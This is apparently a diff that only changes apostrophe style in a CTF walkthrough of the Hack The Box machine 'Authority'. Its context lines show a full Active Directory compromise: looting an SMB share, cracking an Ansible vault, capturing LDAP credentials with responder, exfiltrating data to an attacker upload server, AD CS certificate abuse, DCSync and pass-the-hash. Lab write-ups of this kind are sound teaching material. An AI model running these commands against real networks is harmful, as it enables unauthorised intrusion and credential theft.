@@ -25,13 +25,13 @@ PORT     STATE SERVICE       VERSION
 8443/tcp open  ssl/https-alt
 ```
 
-We have what looks like a domain controller. Let's add `authority.htb` to hosts:
+We have what looks like a domain controller. Let’s add `authority.htb` to hosts:
 
 ```bash
 $ sudo bash -c "echo ${TARGET} authority.htb >> /etc/hosts"
 ```
 
-Starting from the top let's try a zone transfer.
+Starting from the top let’s try a zone transfer.
 
 ```bash
 $ dig axfr @$TARGET authority.htb
@@ -42,7 +42,7 @@ $ dig axfr @$TARGET authority.htb
 ; Transfer failed.
 ```
 
-Doesn't work. Let's check the website on port 80.
+Doesn’t work. Let’s check the website on port 80.
 
 ```bash
 $ gobuster vhost -u authority.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o recon/vhostbust
@@ -59,7 +59,7 @@ Seems to just be a default IIS server.
 $ rpcclient -N -U "" $TARGET
 ```
 
-Can connect but can't enumerate anything, enum4linux doesn't work either.
+Can connect but can’t enumerate anything, enum4linux doesn’t work either.
 
 ```bash
 $ rpcdump.py $TARGET | grep MS-RPRN
@@ -128,7 +128,7 @@ $ smbmap -H $TARGET -u 'anon'
 	SYSVOL                                            	NO ACCESS	Logon server share
 ```
 
-Seems we have access to a share as the anonymous user. Let's download all the files for a closer inspection.
+Seems we have access to a share as the anonymous user. Let’s download all the files for a closer inspection.
 
 ```bash
 $ smbget -R smb://$TARGET/Development/
@@ -319,7 +319,7 @@ notifications:
       - https://t2d.idolactiviti.es/notify
 ```
 
-The vault password seems to be stored in a travis secure env. Apparently it's encrypted using a public key and the private key is kept well hidden by travis so unlikely to be crackable. Though the vault pass might be.
+The vault password seems to be stored in a travis secure env. Apparently it’s encrypted using a public key and the private key is kept well hidden by travis so unlikely to be crackable. Though the vault pass might be.
 
 ```bash
 $ echo '$ANSIBLE_VAULT;1.1;AES256
@@ -347,7 +347,7 @@ $ /usr/share/john/ansible2john.py ldap_admin_password > hash
 $ hashcat --user hash /usr/share/wordlists/rockyou.txt
 ```
 
-Hashcat gives us the password of `!@#$%^&*` so let's decrypt the passwords:
+Hashcat gives us the password of `!@#$%^&*` so let’s decrypt the passwords:
 
 ```bash
 $ ansible-vault view ldap_admin_password
@@ -363,7 +363,7 @@ Vault password:
 pWm_@dm!N_!23
 ```
 
-We have a bunch of creds to check now but let's have a look at the website on port 8443 first.
+We have a bunch of creds to check now but let’s have a look at the website on port 8443 first.
 
 ![PWM service login page](Assets/ldap_pwm_self_service.jpg)
 
@@ -377,15 +377,15 @@ Clicking on Configuration Manager we get a password prompt. Entering the `pWm_@d
 
 ![Login prompt on the config manager page of PWM](Assets/config_manager.jpg)
 
-Here we can get the db and the config but there doesn't seem to be anything interesting inside.
+Here we can get the db and the config but there doesn’t seem to be anything interesting inside.
 
 ![Config manager page after logging in](Assets/config_manager_auth.jpg)
 
-Going over to the editor page we're greeted with a ton of options. Most interesting is the ldap connection page where we seem to be able to change the ldap url the service with try to authenticate to.
+Going over to the editor page we’re greeted with a ton of options. Most interesting is the ldap connection page where we seem to be able to change the ldap url the service with try to authenticate to.
 
 ![ldap connection settings of the PWM application](Assets/ldap_connection_settings.jpg)
 
-Let's change the ldap url to point to our vm and start responder to see if we can snatch some creds.
+Let’s change the ldap url to point to our vm and start responder to see if we can snatch some creds.
 
 ![The ldap connection address field after entering attacker vm ip](<Assets/change_ldap_url.jpg>)
 
@@ -397,7 +397,7 @@ $ sudo responder -I tun0
 [LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
 ```
 
-Great! After pressing the `Test LDAP Profile` we get some creds. Let's see if we can auth as the svc_ldap user.
+Great! After pressing the `Test LDAP Profile` we get some creds. Let’s see if we can auth as the svc_ldap user.
 
 ```bash
 $ cme winrm $TARGET -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
@@ -406,7 +406,7 @@ HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985
 HTTP        10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
 ```
 
-Awesome, let's login using evil-winrm and run SharpHound + Winpeas to get some more information.
+Awesome, let’s login using evil-winrm and run SharpHound + Winpeas to get some more information.
 
 ```bash
 $ py -m uploadserver
@@ -423,7 +423,7 @@ $ py -m uploadserver
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-FileUpload -File ./bloodHound.zip -Uri http://10.10.14.11:8000/upload
 ```
 
-The winpeas output looks rather mangled when viewing with less so let's print it out using powershell on linux:
+The winpeas output looks rather mangled when viewing with less so let’s print it out using powershell on linux:
 
 ```powershell
 $ pwsh
@@ -445,7 +445,7 @@ $ gc pout
  ... snip ...
 ```
 
-Seems like there is a certificate that can be used for authentication. Let's run certipy to see if it can be exploited.
+Seems like there is a certificate that can be used for authentication. Let’s run certipy to see if it can be exploited.
 
 ```bash
 $ certipy find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable
@@ -547,7 +547,7 @@ Certipy v4.8.0 - by Oliver Lyak (ly4k)
 [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 ```
 
-Can't seem to get an admin TGT. Googling the error we can find [this](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d) page which mentions using another tool and ldap. `certipy` seems to have an option called ldap-shell, so let's try that.
+Can’t seem to get an admin TGT. Googling the error we can find [this](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d) page which mentions using another tool and ldap. `certipy` seems to have an option called ldap-shell, so let’s try that.
 
 ```bash
 $ certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell
@@ -561,7 +561,7 @@ Type help for list of commands
 Adding user: hax to group Domain Admins result: OK
 ```
 
-Seems to work. Since we're admin we can add the computer account to the Domain Admins groups. At this point we have access to a Domain Admin account and we can do all kinds of fun things. One way to get a NT AUTHORITY\SYSTEM shell would be to make use of RunAs.exe from [SharpCollection](https://github.com/Flangvik/SharpCollection) but here i've decided to stick to linux based tools.
+Seems to work. Since we’re admin we can add the computer account to the Domain Admins groups. At this point we have access to a Domain Admin account and we can do all kinds of fun things. One way to get a NT AUTHORITY\SYSTEM shell would be to make use of RunAs.exe from [SharpCollection](https://github.com/Flangvik/SharpCollection) but here i’ve decided to stick to linux based tools.
 
 ```bash
 $ impacket-secretsdump 'authority.htb/hax$:Pm0ZDqa5XlOkgYI7@authority.htb'
@@ -618,4 +618,4 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-Since we have access to a Domain Admin account we can do a DCSync attack using `impacket-secretsdump`. This way even if the box removes the computer account we've added we can get an Administrator shell. We could try a Golden Ticket attack here since we have the hash of the krbtgt account but i've just done a pass the hash attack with impacket-psexec to get a shell and access root.txt
+Since we have access to a Domain Admin account we can do a DCSync attack using `impacket-secretsdump`. This way even if the box removes the computer account we’ve added we can get an Administrator shell. We could try a Golden Ticket attack here since we have the hash of the krbtgt account but i’ve just done a pass the hash attack with impacket-psexec to get a shell and access root.txt
